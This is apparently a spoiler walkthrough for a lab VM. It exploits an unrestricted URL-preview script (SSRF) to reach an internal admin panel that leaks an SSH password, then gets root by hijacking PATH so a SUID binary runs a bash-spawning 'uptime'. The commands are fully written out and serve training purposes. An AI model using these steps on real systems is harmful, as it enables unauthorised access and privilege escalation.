# web-ssrf - walkthrough (spoilers)

The intended path. The SSH password and flags are randomised per build, so the
only way in is the SSRF, not guessing.

## 1. Recon
The box serves a web app on port 80.

```
nmap -sV <ip>
curl http://<ip>/
```

The page is a "preview any link" tool and mentions an internal admin service on
`localhost:8000` that is not exposed externally.

## 2. SSRF -> internal service -> credentials
`preview.php` fetches any URL server-side with no restriction. Point it at the
internal service, which is only reachable from the box itself:

```
curl -G "http://<ip>/preview.php" --data-urlencode "url=http://127.0.0.1:8000"
```

The internal admin panel returns `ops`'s SSH password (a random string, unique
to this build - not guessable or crackable, so the SSRF is the only foothold).

## 3. Foothold
```
ssh ops@<ip>            # password from the internal panel
cat ~/user.txt
```

## 4. Privilege escalation (SUID PATH hijack)
```
find / -perm -4000 2>/dev/null       # /usr/local/bin/status
strings /usr/local/bin/status        # runs "uptime" by name, not full path
```

`status` is SUID root and calls `uptime` without an absolute path, so put a
malicious `uptime` first on PATH:

```
cd /tmp
printf '#!/bin/bash\n/bin/bash\n' > uptime
chmod +x uptime
PATH=/tmp:$PATH /usr/local/bin/status
id                                    # uid=0(root)
cat /root/root.txt
```

Both flags match `vms/web-ssrf/flags.txt`, which the build engine writes for the
operator.
